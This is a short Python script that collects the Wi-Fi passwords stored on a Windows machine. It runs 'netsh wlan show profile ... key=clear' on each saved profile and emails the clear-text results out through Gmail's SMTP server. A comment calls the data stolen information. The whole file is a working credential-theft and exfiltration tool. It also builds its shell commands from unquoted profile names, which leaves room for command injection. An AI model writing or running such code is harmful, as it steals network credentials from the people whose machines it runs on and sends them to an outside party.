from os import getenv
import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email, message) #send from myself, to myself, with the stole information
    server.quit()


get_networks_command = "netsh wlan show profile"
networks = subprocess.check_output(get_networks_command,shell=True).decode("utf-8")
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
results = ""
for name in network_names:
    network_password_command = "netsh wlan show profile " + name + " key=clear"
    network_password_list = subprocess.check_output(network_password_command,shell=True).decode("utf-8")
    results += network_password_list

send_mail("","",results)
